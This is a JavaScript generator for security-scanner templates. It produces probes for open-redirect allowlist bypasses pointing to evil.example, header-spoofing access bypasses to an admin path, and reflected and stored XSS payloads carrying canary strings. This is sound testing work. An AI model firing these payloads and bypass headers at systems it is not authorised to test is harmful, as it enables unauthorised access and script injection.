const redir3P = ["https://trusted.com.evil.example/", "https://trusted.com%2eevil.example/", "https://trusted.com%252eevil.example/", "//trusted.com.evil.example/", "https://trusted.com@evil.example/", "https://trusted.com%2f%2e%2e/evil.example"];
redir3P.forEach((pay, i) => {
  const param = ["next", "url"][i % 2];
  act("redirect", `redirect3-${String(i + 1).padStart(3, "0")}`, `Allowlist bypass via ${param}`,
    "high", ["redirect", "open-redirect", "bypass"], `Bypasses trusted.com allowlist via ${param}`,
    [R("{{BaseURL}}", { [param]: [pay] }, [{ type: "word", part: "headers", words: ["evil.example"] }])]);
});


const bypassH = [["X-Original-URL", "/admin"], ["X-Rewrite-URL", "/admin"], ["X-Override-URL", "/admin"], ["X-Forwarded-For", "127.0.0.1"], ["X-Remote-IP", "127.0.0.1"], ["X-Originating-IP", "127.0.0.1"], ["X-Remote-Addr", "127.0.0.1"], ["True-Client-IP", "127.0.0.1"], ["X-Real-IP", "127.0.0.1"], ["Forwarded", "for=127.0.0.1"], ["X-HTTP-Method-Override", "GET"], ["X-Method-Override", "GET"]];
bypassH.forEach(([hk, hv], i) => {
  act("exposure", `bypass-${String(i + 1).padStart(3, "0")}`, `Header bypass ${hk}`,
    "high", ["bypass", "auth", "headers"], `Reaches /admin2 via ${hk}`,
    [{ method: "GET", path: "{{BaseURL}}/admin2", sendHeaders: { [hk]: hv }, matchers: [{ type: "status", status: [200] }] }]);
});


const strictP = ["<svg onload=SX>", "<script>SX</script>", "<img src=x onerror=SX>", "\"><script>SX</script>", "<details open ontoggle=SX>"];
const strictParams = ["q", "s", "search", "query"];
for (let i = 0; i < 20; i++) {
  const canary = `sx${String(i).padStart(3, "0")}`;
  const shape = strictP[i % strictP.length];
  const payload = shape.replace(/SX/g, canary);
  const param = strictParams[i % strictParams.length];
  act("xss", `strict-${String(i + 1).padStart(3, "0")}`, `Strict raw XSS via ${param}`,
    "high", ["xss", "injection", "strict"], `Fires only on raw brackets, not encoded`,
    [{ method: "GET", path: "{{BaseURL}}", payloads: { [param]: [payload] }, matchAll: true,
       matchers: [{ type: "word", part: "body", words: [canary] }, { type: "regex", part: "body", regex: [`<[a-zA-Z/!][^<>]{0,40}${canary}`] }] }]);
}


const storedFields = ["text", "comment", "message", "body", "content"];
for (let i = 0; i < 10; i++) {
  const canary = `store${String(i + 1).padStart(3, "0")}`;
  const field = storedFields[i % storedFields.length];
  const asForm = i % 2 === 1;
  act("stored", `stored-${String(i + 1).padStart(3, "0")}`, `Stored XSS via notes.${field}`,
    "high", ["xss", "stored"], `Stores canary, reads it back on /notes`,
    [{ method: "POST", path: "{{BaseURL}}/notes",
       ...(asForm ? { sendHeaders: { "Content-Type": "application/x-www-form-urlencoded" }, body: `${field}=<script>${canary}</script>` }
                  : { sendHeaders: { "Content-Type": "application/json" }, body: JSON.stringify({ [field]: `<script>${canary}</script>` }) }) },
     { method: "GET", path: "{{BaseURL}}/notes",
       matchers: [{ type: "word", part: "body", words: [canary] }] }]);
}

console.log(`pack2 generated ${n} templates`);
